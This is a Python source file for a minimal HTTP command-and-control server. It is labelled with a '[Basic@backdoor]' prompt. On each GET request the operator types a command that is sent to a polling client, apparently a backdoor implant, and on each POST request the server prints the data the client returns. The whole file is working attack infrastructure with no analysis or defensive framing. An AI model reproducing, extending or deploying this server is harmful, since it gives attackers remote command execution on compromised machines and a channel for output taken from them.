import http.server, os

HOST_NAME = "localhost"  # You can leave this as localhost
PORT_NUMBER = 5000       # Port 5000 is still used locally

class HTTPHandler(http.server.BaseHTTPRequestHandler):
    
    def do_GET(self):
        c2_command = input('[Basic@backdoor] ')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(c2_command.encode())
    
    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        PostData = self.rfile.read(length)
        print(PostData.decode())

if __name__ == '__main__':
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), HTTPHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[-] Server Terminated')
